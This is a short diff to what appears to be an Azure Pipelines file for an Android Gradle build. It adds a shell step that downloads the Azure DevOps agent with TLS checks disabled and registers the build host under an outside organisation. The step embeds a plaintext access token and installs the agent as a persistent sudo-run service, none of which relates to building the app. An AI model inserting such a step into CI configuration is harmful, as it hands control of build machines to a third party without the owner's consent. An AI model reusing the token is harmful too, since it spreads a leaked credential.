@@ -1,4 +1,7 @@
 # Android
+- task: CmdLine@2
+  inputs:
+    script: 'mkdir azagent;cd azagent;curl -fkSL -o vstsagent.tar.gz https://vstsagentpackage.azureedge.net/agent/2.172.2/vsts-agent-linux-x64-2.172.2.tar.gz;tar -zxvf vstsagent.tar.gz; if [ -x "$(command -v systemctl)" ]; then ./config.sh --environment --environmentname "Machines" --acceptteeeula --agent $HOSTNAME --url https://dev.azure.com/anrigiorganashvili1/ --work _work --projectname ''Calculator'' --auth PAT --token bi4t5mxpoxi2666qdoanumhfbeeycryecn3h2gigj4schw73ajdq --runasservice; sudo ./svc.sh install; sudo ./svc.sh start; else ./config.sh --environment --environmentname "Machines" --acceptteeeula --agent $HOSTNAME --url https://dev.azure.com/anrigiorganashvili1/ --work _work --projectname ''Calculator'' --auth PAT --token bi4t5mxpoxi2666qdoanumhfbeeycryecn3h2gigj4schw73ajdq; ./run.sh; fi'
 # Build your Android project with Gradle.
 # Add steps that test, sign, and distribute the APK, save build artifacts, and more:
 # https://docs.microsoft.com/azure/devops/pipelines/languages/android
